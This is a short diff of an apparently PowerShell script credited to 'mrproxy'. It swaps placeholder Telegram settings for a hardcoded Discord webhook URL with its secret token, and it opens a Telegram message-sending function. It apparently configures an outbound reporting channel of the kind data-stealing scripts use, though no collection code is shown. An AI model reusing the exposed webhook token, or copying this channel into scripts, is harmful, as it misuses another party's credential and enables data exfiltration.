@@ -1,7 +1,7 @@
 # Created by mrproxy
-# $botToken = "bot_token"
-# $chatID = "chat_id"
-# $webhook = "dc_webhook"
+#$botToken = "bot_token"
+#$chatID = "chat_id"
+$webhook = "https://discordapp.com/api/webhooks/1286243030281617429/QIoRRn9aZU0u_VS6Phdt759_HPQ-j1JX2tdYpsMeMGWAG0say5KZwTsmDmdYo75MTpQV"
 
 # Function for sending messages through Telegram Bot
 function Send-TelegramMessage {
